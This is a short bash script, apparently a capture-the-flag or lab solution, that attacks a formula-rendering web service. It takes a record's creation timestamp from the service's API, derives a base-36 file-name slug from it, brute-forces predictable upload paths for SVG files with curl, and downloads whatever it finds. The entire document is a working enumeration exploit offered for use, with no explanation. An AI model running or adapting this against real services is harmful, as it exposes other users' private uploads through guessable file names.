#!/usr/bin/env bash

bail() {
    echo "$1" >&2
    exit 1
}

ito36() {
    local Alphabet=(0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w x y z)
    for i in $(bc <<<"obase=36; $1"); do
        echo -n ${Alphabet[$(( 10#$i ))]}
    done
}

[[ -z $Host ]] && bail "Provide a hostname"
[[ -z $Token ]] && bail "Provide a token"

Url=https://radikal.$Host/$Token

OriginalDate=$(date +'%s%N' --date=$(curl -s $Url/api/formulas | jq '.[] | select(.id == 1).created_at' -r) | head -c -7)
Slug=$(ito36 $(( $OriginalDate % (36 * 36) )) )

echo Trying with slug $Slug

Tempdir=$(mktemp -d)
cd $Tempdir
for First in {0..9} {a..z}; do
    echo Guessing $First...
    curl -Z -s -f --remote-name-all \
        $Url/uploads/formula_${Slug}00p${First}[0-9].svg \
        $Url/uploads/formula_${Slug}00p${First}[a-z].svg
done

xdg-open $Tempdir
